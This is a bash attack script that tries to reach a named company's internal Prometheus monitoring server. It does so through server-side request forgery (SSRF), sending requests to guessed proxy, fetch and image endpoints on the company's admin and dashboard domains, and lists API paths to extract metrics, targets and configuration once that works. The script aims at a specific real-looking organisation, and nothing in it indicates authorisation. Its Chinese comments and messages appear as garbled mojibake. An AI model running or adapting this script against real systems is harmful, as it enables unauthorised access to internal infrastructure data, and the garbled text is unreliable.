#!/bin/bash
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "ğŸ”¥ å†…ç½‘ç›‘æ§ç³»ç»Ÿï¼šprometheus.ghtk.vn (10.110.28.141)"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

TARGET="prometheus.ghtk.vn"
INTERNAL_IP="10.110.28.141"

echo "[*] å°è¯•è®¿é—®Prometheusï¼ˆå¯èƒ½é€šè¿‡SSRFï¼‰"

echo ""
echo "[*] æµ‹è¯•1ï¼šç›´æ¥è®¿é—®ï¼ˆä¸å¯è¾¾ï¼‰"
timeout 3 curl -s "http://$INTERNAL_IP:9090" && echo "âœ… å¯è®¿é—®ï¼" || echo "âŒ å†…ç½‘ä¸å¯è¾¾ï¼ˆéœ€è¦SSRFï¼‰"

echo ""
echo "[*] æµ‹è¯•2ï¼šé€šè¿‡å·²çŸ¥æœåŠ¡SSRFè®¿é—®"
SSRF_TARGETS=(
    "https://admin.giaohangtietkiem.vn/api/proxy?url=http://$INTERNAL_IP:9090"
    "https://inter.ghtk.vn/api/fetch?url=http://$INTERNAL_IP:9090"
    "https://dashboard.ghtk.vn/api/image?url=http://$INTERNAL_IP:9090"
)

for ssrf_url in "${SSRF_TARGETS[@]}"; do
    echo "  å°è¯•: $ssrf_url"
    resp=$(curl -sk "$ssrf_url" -m 3 2>&1)
    echo "$resp" | grep -qi "prometheus\|metrics\|targets" && echo "    âœ… SSRFæˆåŠŸï¼å¯èƒ½æ³„éœ²Prometheusæ•°æ®ï¼"
done

echo ""
echo "[*] å¸¸è§Prometheusç«¯ç‚¹"
PROM_PATHS=(
    "/api/v1/targets"
    "/api/v1/query"
    "/metrics"
    "/graph"
    "/config"
)

echo "  å¦‚æœèƒ½SSRFè®¿é—®ï¼Œå°è¯•è¿™äº›è·¯å¾„ï¼š"
for path in "${PROM_PATHS[@]}"; do
    echo "    http://$INTERNAL_IP:9090$path"
done

echo ""
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
